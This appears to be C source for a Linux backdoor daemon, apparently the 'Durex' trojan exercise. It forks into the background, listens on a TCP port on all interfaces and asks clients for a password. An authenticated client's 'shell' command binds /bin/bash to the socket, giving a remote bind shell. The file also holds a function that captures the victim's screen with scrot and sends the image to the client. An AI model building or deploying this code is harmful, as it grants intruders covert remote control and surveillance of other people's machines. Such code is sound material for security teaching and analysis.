#include "durex.h"

bool	setup_deamon(t_connexion *connexion, uint16_t port)
{
	umask(0);
	if (setsid() == -1)
	{
		perror("setsid()");
		return (false);
	}
	chdir("/");

	if((connexion->master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0)
	{
		perror("socket()");
		return (false); 
	}

	if ( setsockopt(connexion->master_socket, SOL_SOCKET, SO_REUSEADDR,
		(char *)&connexion->opt, sizeof(connexion->opt)) < 0)
	{
		perror("setsockopt()");
		return (false); 
	}

	connexion->address.sin_family = AF_INET;
	connexion->address.sin_addr.s_addr = INADDR_ANY;
	connexion->address.sin_port = htons(port);

	if (bind(connexion->master_socket, (struct sockaddr *)&connexion->address,
		sizeof(connexion->address)) < 0)
	{
		perror("bind()");
		return (false);
	}
	return (true);
}

void	create_daemon()
{
	pid_t	ps_deamon = 0;

	ps_deamon = fork();
	if (ps_deamon == -1)
	{
		perror("fork failed");
		exit(errno);
	}
	else if (ps_deamon > 0)
	{
		puts("daemon created");
		exit(0);
	}
	//close(STDIN_FILENO);
	//close(STDERR_FILENO);
	//close(STDOUT_FILENO);
}

static bool	new_client(t_connexion *connexion, t_users *users)
{
	if (FD_ISSET(connexion->master_socket, &users->readfds))
	{
		if ((users->new_socket = accept(connexion->master_socket,
						(struct sockaddr *)&connexion->address, (socklen_t*)&connexion->addrlen)) < 0)
		{
			perror("accept");
			return (false);
		}
		if (users->nb_user >= 3)
		{
			puts("Connexion limit reached");
			close(users->new_socket);
		}
		else
		{
			for (users->i = 0; users->i < MAX_CLIENT; users->i++)
			{
				if (connexion->client_socket[users->i] == 0 )
				{
					connexion->client_socket[users->i] = users->new_socket;
					/*tintin->write_log("New client, id : " + std::to_string(i + 1), "\033[1;32mINFO\033[0m");*/
					break;
				}
			}
			users->nb_user++;
		}
	}
	return (true);
}

static void	spawn_shell(t_users *users, char **envp)
{
	pid_t	pid = 0;
	char	*shell[] = {"/bin/bash", NULL};
	int		status;

	pid = fork();
	if (pid == -1)
	{
		perror("fork failed");
	}
	else if (pid == 0)
	{
		for(int i=0; i<3; i++)
			dup2(users->sd, i);
		send(users->sd, "\033[31mSpawning shell\033[0m\n> ", 24, 0);
		if (execve(shell[0], shell, envp) == -1)
			printf("error\n");
	}
	else
	{
		waitpid(pid, &status, 0);
		kill(pid, SIGTERM);
	}
	exit(0);
}

static void	screenshot(t_users *users, char **envp)
{
	char		*screen[] = {"/usr/bin/scrot", "/tmp/test1.png", NULL};
	char		img[4096] = {0};
	pid_t		pid = 0;
	int			status;
	int			fd = 0;
	struct stat	st;
	/*size_t		img_size = 0;*/
	ssize_t		ret_read = 0;

	int ret;

	pid = fork();
	if (pid == -1)
		perror("fork failed");
	else if (pid == 0)
	{
		if ((ret = execve(screen[0], screen, envp)) == -1)
			perror("execve");
	}
	else
	{
		waitpid(pid, &status, 0);
		kill(pid, SIGTERM);
	}
	fd = open("/tmp/test1.png", O_RDONLY);
	if (fd == -1)
		perror("open");
	if (stat("/tmp/test1.png", &st) == -1)
		perror("stat");
	/*img_size = (size_t)st.st_size;*/
	sprintf(img, "%zu", st.st_size);
	send(users->sd, &img, strlen(img), 0);
	char *map = mmap(0, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
	if (map == MAP_FAILED)
	{
		perror("mmap");
		exit(0);
	}
	printf("real size  = %zu\n", st.st_size);
	send(users->sd, map, (size_t)st.st_size, 0);
	unlink("/tmp/test1.png");
}

bool	run_daemon(t_connexion *connexion, char **envp)
{
	char		buffer[BUFFSIZE + 1];
	ssize_t		valrecv = 0;
	t_users		users;

	memset(&users, 0, sizeof(users));


	if (listen(connexion->master_socket, 3) < 0)
	{
		perror("listen() failure");
		return (false);
	}

	connexion->addrlen = sizeof(connexion->address);

	while(true)
	{
		FD_ZERO(&users.readfds);
		FD_SET(connexion->master_socket, &users.readfds);
		users.max_sd = connexion->master_socket;

		for (users.i = 0 ; users.i < MAX_CLIENT; users.i++)
		{
			users.sd = connexion->client_socket[users.i];
			if (users.sd > 0)
				FD_SET(users.sd , &users.readfds);
			if (users.sd > users.max_sd)
				users.max_sd = users.sd;
		}
		users.activity = select(users.max_sd + 1 , &users.readfds , NULL , NULL , NULL);
		//if ((activity < 0) && (errno!=EINTR))
			////printf("select error");
		if (new_client(connexion, &users) == false)
			return (false);
		for (users.i = 0; users.i < MAX_CLIENT; users.i++)
		{
			users.sd = connexion->client_socket[users.i];
			if (FD_ISSET(users.sd , &users.readfds) && users.key[users.i] == false)
				send(users.sd, "KEY: ", 5, 0);
			if (FD_ISSET(users.sd , &users.readfds))
			{
				if (users.key[users.i] == true)
					send(users.sd, "> ", 2, 0);
				if ((valrecv = recv(users.sd , buffer, BUFFSIZE, 0)) == 0)
				{
					close(users.sd);
					connexion->client_socket[users.i] = 0;
					users.nb_user--;
					users.key[users.i] = false;
				}
				else
				{
					buffer[valrecv -1] = '\0';
					if (users.key[users.i] == false)
					{
						ft_crypt(buffer, (off_t)strlen(buffer));
						if (!strcmp(buffer, PSWD))
							users.key[users.i] = true;
					}
					else
					{
						// c'est ici qu'on interprete la command
						if (!strcmp(buffer, "quit"))
						{
							close( users.sd );
							connexion->client_socket[users.i] = 0;
							users.key[users.i] = false;
							users.nb_user--;
						}
						if (!strcmp(buffer, "?"))
							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screen\n> ", 63, 0);
						else if (!strcmp(buffer, "shell"))
							spawn_shell(&users, envp);
						else if (strlen(buffer))
							send(users.sd, "\nCommand not found. Type ? for print all command\n> ", 51, 0);
					}
					memset(&buffer, 0, BUFFSIZE);
				}
			}
			for (int j = 0; j <= 2; j++)
			{
				if (connexion->client_socket[j] != 0)
					break;
				/*else if (j == 2)*/
					/*return (true);*/
			}
		}
	}
	return (true);
}
